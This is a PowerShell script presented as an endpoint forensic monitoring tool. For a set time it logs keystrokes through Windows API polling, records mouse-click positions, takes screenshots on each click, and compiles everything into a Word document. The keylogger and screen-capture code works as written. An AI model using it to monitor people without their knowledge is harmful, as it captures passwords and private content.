<#
Author: Lukeman Hakkim Sheik Alavudeen

Title: EndPoint forensic monitoring system
#>


$Time = Read-Host "Enter the time(in Seconds) to monitor the system"

#Stopwatch
$stopWatch = [system.diagnostics.stopwatch]::StartNew()
$timeSpan = New-TimeSpan -Minutes 0 -Seconds $Time


##########################
# Capturing a screenshot
##########################

function take_screenshots ($File)
{
    #$File = "$home\Desktop\MyFancyScreenshot.bmp"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    # Gather Screen resolution information
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    # Create bitmap using the top-left and bottom-right bounds
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    # Create Graphics object
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    # Capture screen
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    # Save to file
    $bitmap.Save($File) 
    Write-Output "Screenshot saved to:"
    Write-Output $File
}



#requires -Version 2 
function Start-KeyLogger() 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@ 
 
  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)
 
        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock
 
          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)
 
          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
 
          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

 
          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if($mychar){
          return $mychar.ToString()}
 
      }
    }
   }
 

##############################################
#1.To Monitor the mouse clicks
#2.To take screenshots on mouse click
#3.To monitor the keystrokes
##############################################

$count=0
$dict_count=1
$master_dict=@{}

do
{

 $mouse_events = [System.Windows.Forms.UserControl]::MouseButtons
 if (($mouse_events -like "left") -or ($mouse_events -like "right"))
 {
     
     #To monitor the mouse coordinates
     $pos = [System.Windows.Forms.Cursor]::Position
     $pos_str = "The Mouse coordinates are $pos`n"

     #count for mouse coordinates
     $master_dict.Add($dict_count, $pos_str)
     $dict_count+=1


     #To capture the screenshots on click 
     echo "captured" 
     #Start-Sleep -Seconds 1
     $count +=1
     $File = "$home\Desktop\screenshots\MyScreenshot" + $count + ".bmp"
     take_screenshots ($File)

     #count for screenshots
     $master_dict.Add($dict_count, "Myscreenshot"+$count)
     $dict_count+=1
     
 }

 # records all key presses
 $key_pressed = Start-KeyLogger

 #count for keypressed
 $master_dict.Add($dict_count, $key_pressed)
 $dict_count+=1


}until ($stopWatch.Elapsed -ge $timeSpan)



########################################
#File Handling
########################################
$savepath = "$home/Desktop/Images.docx"
$wdStory = 6 
$wdMove = 0
$objWord = New-object -comobject Word.Application  
$objWord.Visible = $True 
$objDoc = $objWord.Documents.Open($savepath) 
$objSelection = $objWord.Selection 
$a = $objSelection.EndKey($wdStory, $wdMove) 
$objSelection.TypeParagraph() 
$objSelection.TypeParagraph() 



###############################################
#To  write data in a sequential Manner 
###############################################
for ($i = 1; $i -lt $master_dict.Count+1; $i++)

    {
    
    $key = $i
    $value=$master_dict[$i]

    #Write-Host ("Key = " + $key + " and Value = " + $value);

    if ($value -like "")
    {
    continue
    }

    else

    {
        if ((($value).Contains("Myscreenshot")) -eq "True")
        {
        #To write the image file
        $objSelection.TypeParagraph()
        $objShape = $objSelection.InlineShapes.AddPicture("$home\Desktop\screenshots\$value"+".bmp")
        $objSelection.TypeParagraph()
        Start-Sleep -Seconds 1
        continue
        }
        else
        {
         $objSelection.TypeText($value)
         #$objSelection.TypeParagraph()
        }
    }
}   

$objdoc.SaveAs([ref]$savepath) 
$objdoc.Close() 
$objword.quit() 





